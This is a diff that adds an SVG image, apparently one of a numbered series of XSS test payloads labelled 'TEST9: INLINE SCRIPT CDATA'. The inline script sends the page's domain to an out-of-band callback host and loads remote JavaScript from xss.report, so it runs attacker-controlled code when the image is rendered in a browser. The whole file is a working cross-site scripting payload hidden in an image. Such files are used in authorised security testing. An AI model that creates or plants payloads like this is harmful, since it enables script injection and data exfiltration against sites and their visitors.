@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+  <script type="text/javascript">
+    //<![CDATA[
+      var x = new Image();
+      x.src = 'https://xpxhznhjlolwxxyvdurgehk2cmtiyvvhh.oast.fun/test9-inline-script?dom=' + encodeURIComponent(document.domain);
+      // Also try xss.report
+      var s = document.createElement('script');
+      s.src = 'https://xss.report/c/pr0xy';
+      document.documentElement.appendChild(s);
+    //]]>
+  </script>
+  <rect width="500" height="500" fill="#8e44ad"/>
+  <text x="60" y="250" fill="white" font-size="20">TEST9: INLINE SCRIPT CDATA</text>
+</svg>
